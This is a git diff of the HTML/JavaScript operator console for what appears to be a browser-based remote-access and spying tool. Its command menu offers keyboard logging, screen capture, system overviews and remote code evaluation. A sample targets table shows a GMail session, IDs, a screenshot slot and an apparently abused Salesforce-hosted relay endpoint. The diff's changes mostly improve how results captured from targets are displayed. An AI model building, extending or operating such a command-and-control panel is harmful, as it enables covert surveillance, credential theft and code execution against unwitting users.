@@ -106,10 +106,7 @@
                         <option value="GetScreenCapture">GetScreenCapture</option>
                         <option value="GetKeyboardLog">GetKeyboardLog</option>
                         <option value="GetSystemOverview">GetSystemOverview</option>
-<<<<<<< HEAD
                         <option value="GetClientCommands">GetClientCommands</option>
-=======
->>>>>>> eb4b15ca8fc0710789406182c28c155141ca1759
                     </select>              
                 </td>
                 <td>
@@ -131,11 +128,6 @@
     <br/>
 
     <div>
-        <div>
-            <label for="cmdResult">Execution Result:</label><br/>
-            <textarea id="cmdResult" class="code-input" placeholder="Type your code here..."></textarea>
-        </div>
-
         <table>
             <tr>
                 <td>Targets:</td>
@@ -185,49 +177,61 @@
     <br/>
     <br/>
     
-    <div>
-        <table border="1">
-            <tr>
-                <th>Targets (
-                <a href="javascript:void(0);" onclick="collapseTable('targetsList');">Collapse</a> |                
-                <a href="javascript:void(0);" onclick="expandTable('targetsList');">Expand</a> |
-                <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetTargets'));">Get Targets</a> |
-                <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('RefreshTargets'));">Refresh Targets</a>
-                )</th>
-            </tr>
-        </table>
-    </div>
+    <table border="1">
+        <tr>
+            <th>Results (
+            <a href="javascript:void(0);" onclick="collapseTable('resultsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('resultsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="clearTable('resultsList');">Clear</a> )</th>
+        </tr>
+    </table>
+
+    <table id="resultsList">
+    </table>
+
+
+    <br/>
+    <br/>
+
+    <table border="1">
+        <tr>
+            <th>Targets (
+            <a href="javascript:void(0);" onclick="collapseTable('targetsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('targetsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetTargets'));">Get Targets</a> |
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('RefreshTargets'));">Refresh Targets</a>
+            )</th>
+        </tr>
+    </table>
 
     <br/>
 
-    <div>
-        <table id="targetsList">
-            <tbody>
-                <tr>
-                    <th scope="row" style="text-align: right;">Title</th>
-                    <td>GMail</td>
-                </tr>                    
-                <tr>
-                    <th scope="row" style="text-align: right;">URL</th>
-                    <td>https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub</td>
-                </tr>
-                <tr>
-                    <th scope="row" style="text-align: right;">Target ID</th>
-                    <td>1CA23F6D20DDFF1AAF24A25074BB2692</td>
-                </tr>
-                <tr>
-                    <th scope="row" style="text-align: right;">Session ID</th>
-                    <td>1CA23F6D20DDFF1AAF24A25074BB2692</td>
-                </tr>
-                <tr>
-                    <th scope="row" style="text-align: right;">
-                        <a href="#">Screenshot</a>
-                    </th>
-                    <td>base64 image url</td>
-                </tr>                
-            </tbody>
-        </table>
-    </div>
+    <table id="targetsList">
+        <tbody>
+            <tr>
+                <th scope="row" style="text-align: right;">Title</th>
+                <td>GMail</td>
+            </tr>                    
+            <tr>
+                <th scope="row" style="text-align: right;">URL</th>
+                <td>https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub</td>
+            </tr>
+            <tr>
+                <th scope="row" style="text-align: right;">Target ID</th>
+                <td>1CA23F6D20DDFF1AAF24A25074BB2692</td>
+            </tr>
+            <tr>
+                <th scope="row" style="text-align: right;">Session ID</th>
+                <td>1CA23F6D20DDFF1AAF24A25074BB2692</td>
+            </tr>
+            <tr>
+                <th scope="row" style="text-align: right;">
+                    <a href="#">Screenshot</a>
+                </th>
+                <td>base64 image url</td>
+            </tr>                
+        </tbody>
+    </table>
 
     <br/>
     <br/>
@@ -237,7 +241,9 @@
             <th>Commands (
             <a href="javascript:void(0);" onclick="collapseTable('commandsList');">Collapse</a> |                
             <a href="javascript:void(0);" onclick="expandTable('commandsList');">Expand</a> |
-            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Get Commands</a> )</th>
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Get Commands</a> |
+            <a href="javascript:void(0);" onclick="clearTable('commandsList');">Clear</a> )
+        </th>
         </tr>
     </table>
 
@@ -298,11 +304,17 @@
             return jsonstr;
         }
 
-        function LogMsg(msgstr) {
-            try {
+        function LogMsg(msg) {
 
-                if ( msgstr instanceof Error ) {
-                    msgstr = ErrorToJson(msgstr);
+            try {
+                msgstr = '';
+
+                if ( msg instanceof Error || Error.isError(msg) ) {
+                    msgstr = ErrorToJson(msg);
+                } else if ( typeof msg === 'string' || msg instanceof String ) {
+                    msgstr = msg;
+                } else {
+                    try { msgstr = JSON.stringify(msg); } catch { }
                 }
                 
                 logmsg_index++;
@@ -501,15 +513,22 @@
                 let targets = message.result;
                 refreshTargets(targets);
 
-            } else if ( message.builtincmd == 'GetTargetText' || message.builtincmd == 'ExecEvaluate' ) {
+            } else if ( message.builtincmd == 'GetTargetText' ) {
+                let result = message.result;
+
+                console.log('GetTargetText');
+
+            } else if ( message.builtincmd == 'ExecEvaluate' ) {
                 let result = message.result;
                 result = atob(result);
-                
-                LogMsg('result length: '+result.length);
-                
-                let elem = document.getElementById('cmdResult');
-                elem.value = result;
-            
+                try {
+                    result = JSON.parse(result);
+                } catch (ex) {
+                    // anchor
+                }
+
+                addResult(result);
+
             } else if ( message.builtincmd == 'GetTargetHTML' ) {
                 let result = message.result;
                 
@@ -588,7 +607,7 @@
                     let key = keys[i];
                     let item = obj[key];
 
-                    if ( typeof item == 'object' ) {
+                    if ( item != null && typeof item == 'object' ) {
                         objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
                         continue;
                     }
@@ -692,8 +711,12 @@
             // const table = document.getElementById("commandsList");
             const tbody = table.createTBody();
 
-            let insertrow = (key, item) => {
+            let insertrow = (key, item, bgcolor) => {
                 let newRow = tbody.insertRow(-1);
+                
+                if ( bgcolor ) {
+                    newRow.style.backgroundColor = bgcolor;
+                }
 
                 let newCell = newRow.insertCell(0);
                 newCell.textContent = key;
@@ -710,15 +733,16 @@
 
             let objStack = [];
 
-            objStack.push( {name:'ROOT', payload:command, path:''} );
+            objStack.push( {name:'ROOT', payload:command, path:'', bgcolor:"#696969"} );
 
             while ( objStack.length > 0 ) {
                 let mobj = objStack.pop()
                 let objName = mobj['name'];
                 let obj = mobj['payload'];
                 let path = mobj['path'];
-                
-                insertrow(path + '.' + objName, '[---------]');
+                let bgcolor = mobj['bgcolor'];
+
+                insertrow(path + '.' + objName, '[---------]', bgcolor);
 
                 let keys = Object.getOwnPropertyNames(obj);
 
@@ -726,8 +750,8 @@
                     let key = keys[i];
                     let item = obj[key];
 
-                    if ( typeof item == 'object' ) {
-                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName, bgcolor:"#FFA500"} );
                         continue;
                     }
 
@@ -805,9 +829,59 @@
             sendMessage(payload);
         }
 
-        function clearExecResult() {
-            console.log('clearExecResult');
-            document.getElementById('cmdResult').value = '';
+        function addResult(result) {
+            const table = document.getElementById("resultsList"); // anchor
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item, bgcolor) => {
+                let newRow = tbody.insertRow(-1);
+                
+                if ( bgcolor ) {
+                    newRow.style.backgroundColor = bgcolor;
+                }
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                let txt = JSON.stringify(item, null, 2);
+
+                if ( txt.startsWith('"') && txt.endsWith('"') ) {
+                    txt = txt.slice(1, -1);
+                }
+
+                newCell.textContent = txt;
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:result, path:'', bgcolor:"#696969"} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                let bgcolor = mobj['bgcolor'];
+
+                insertrow(path + '.' + objName, '[---------]', bgcolor);
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName, bgcolor:"#FFA500"} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
         }
 
         function collapseTable(tableid) {
@@ -821,14 +895,9 @@
         }
 
         function clearTable(tableid) {
-            const rows = document.querySelectorAll('#'+tableid+' tbody tr');
+            const table = document.getElementById(tableid);
 
-            rows.forEach(row => {
-                if ( ! row.querySelector('th') ) {
-                    row.remove();
-                }
-            });
-
+            table.querySelectorAll('tbody').forEach(tbody => tbody.remove());
         }
 
     </script>
